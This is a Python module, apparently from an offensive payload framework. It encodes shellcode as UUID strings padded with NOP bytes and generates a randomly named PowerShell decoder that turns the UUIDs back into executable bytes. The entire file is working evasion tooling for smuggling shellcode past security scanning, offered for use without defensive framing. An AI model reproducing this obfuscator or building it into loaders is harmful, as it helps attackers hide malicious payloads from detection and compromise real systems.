import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
function {name} {{
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$encoded
    )
    begin {{
        $buffer = [System.Collections.Generic.List[string]]::new()
    }}
    process {{
        $buffer.AddRange($encoded)
    }}
    end {{
        $decoded = [System.Collections.Generic.List[byte]]::new()
        foreach ($UUID in $buffer){{
            $guid = [guid]$UUID
            $decoded.AddRange($guid.ToByteArray())
        }}
        return $decoded
    }}
}}
""".format(name = self.name)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes_le = chunk)))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')